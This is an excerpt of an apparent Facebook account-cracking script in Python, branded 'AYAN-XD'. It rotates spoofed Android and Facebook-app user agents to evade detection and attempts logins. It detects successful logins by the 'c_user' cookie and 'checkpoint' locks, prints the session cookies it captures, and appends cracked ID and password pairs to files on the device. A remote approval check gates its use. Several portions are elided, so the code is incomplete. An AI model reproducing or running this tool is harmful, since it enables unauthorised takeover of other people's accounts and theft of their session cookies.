...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
   ...
   #NEW#AGENT
    ...
    ugen.append(uaku2)
    AYANxd=[
 "Davik/2.1.0 (Linux; U; Android 11; V2102 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/392.0.0.2061;FBBV/1562277;FBDM/{density=5.3,width=1230,height=2276};FBLC/en_PK;FBRV/901561854;FBCR/Warid;FBMF/RMX2857;FBBD/Realme;FBPN/com.facebook.mlite;FBDV/RMX2857;FBSV/15;FBOP/3;FBCA/x86:armeabi-v7a;]"   
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
          ...
          #  print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AYAN-XD-OK] '+cid+' | '+ps+'\x1b[1;97m')
                print("\33[0;97mCOOKIE : \33[0;97m"+coki)
                open('/sdcard/AYAN-XD-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('\033[1;33m[AYAN-XD-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('/sdcard/AYAN-XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m AYAN \033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/M4STERMIND1/Approval/blob/main/AYAN-XD').text
    if id in httpCaht:
